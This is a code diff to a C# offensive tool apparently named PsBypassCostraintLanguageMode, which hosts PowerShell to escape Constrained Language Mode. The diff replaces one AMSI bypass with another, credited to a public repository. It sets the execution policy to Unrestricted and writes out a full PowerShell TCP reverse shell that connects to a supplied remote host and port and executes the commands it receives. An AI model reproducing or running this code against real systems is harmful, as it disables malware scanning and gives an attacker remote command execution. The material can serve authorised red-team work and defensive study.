@@ -1,10 +1,9 @@
-﻿using System;
+using System;
 using System.Collections.ObjectModel;
 using System.Configuration.Install;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using System.Text;
-using System.Threading.Tasks;
 
 namespace PsBypassCostraintLanguageMode
 {
@@ -22,23 +21,26 @@ namespace PsBypassCostraintLanguageMode
                 port = args[1];
             }
 
-            // Amsi bypass technique from: http://cn33liz.blogspot.co.uk/2016/05/bypassing-amsi-using-powershell-5-dll.html
-            string Arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
-            AmsiBypass.Amsi(Arch);
 
             Runspace runspace = RunspaceFactory.CreateRunspace();
             runspace.Open();
+
+            // OLD ** Amsi bypass technique from: http://cn33liz.blogspot.co.uk/2016/05/bypassing-amsi-using-powershell-5-dll.html
+            // OLD ** string Arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
+            // OLD ** AmsiBypass.Amsi(Arch);
+            // NEW ** https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/master/ASBBypass/Program.cs
+            AmsiBypass.Disable();
 
             // set execution policy to Unrestricted for current process
             // this should bypass costraint language mode from the low priv 'ConstrainedLanguage' to our beloved 'FullLanguage'
             RunspaceInvoke runSpaceInvoker = new RunspaceInvoke(runspace);
             runSpaceInvoker.Invoke("Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process");
 
-            //rev shell one-liner
-            //string revShellcommand = @"$client = New-Object System.Net.Sockets.TCPClient('{RHOST}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
+			//rev shell one-liner
+			//string revShellcommand = @"$client = New-Object System.Net.Sockets.TCPClient('{RHOST}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
 
-            //rev shell better one-liner (pretty printed) with exception handling
-            string revShellcommand = @"$client = New-Object System.Net.Sockets.TCPClient('{RHOST}',{PORT});
+			//rev shell better one-liner (pretty printed) with exception handling
+			string revShellcommand = @"$client = New-Object System.Net.Sockets.TCPClient('{RHOST}',{PORT});
                                     $stream = $client.GetStream();
                                     [byte[]]$bytes = 0..65535|%{0};
                                     while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
@@ -62,7 +64,7 @@ namespace PsBypassCostraintLanguageMode
 
             // funny intro
             if (!revShell)
-                Console.WriteLine("Type your P0w3rSh3ll command down here, you kiddo \n");
+                Console.WriteLine("Type your P0w3rSh3ll command down here \n");
             else
             {
                 revShellcommand = revShellcommand.Replace("{RHOST}", rhost).Replace("{PORT}", port);
@@ -88,6 +90,7 @@ namespace PsBypassCostraintLanguageMode
                     {
                         try
                         {
+
                             pipeline.Commands.AddScript(command);
                             pipeline.Commands.Add("Out-String");
                             // if revshell true - run asyn one-liner script and exit
@@ -97,10 +100,12 @@ namespace PsBypassCostraintLanguageMode
                             }
                             // otherwise stay open and ready to accept and invoke commands
                             Collection<PSObject> results = pipeline.Invoke();
-                            StringBuilder stringBuilder = new StringBuilder();
+							//var process = (Process)pipeline.Output.Read().BaseObject;
+
+							StringBuilder stringBuilder = new StringBuilder();
                             foreach (PSObject obj in results)
                             {
-                                stringBuilder.AppendLine(obj.ToString());
+								stringBuilder.AppendLine(obj.ToString());
                             }
                             Console.Write(stringBuilder.ToString());
                         }
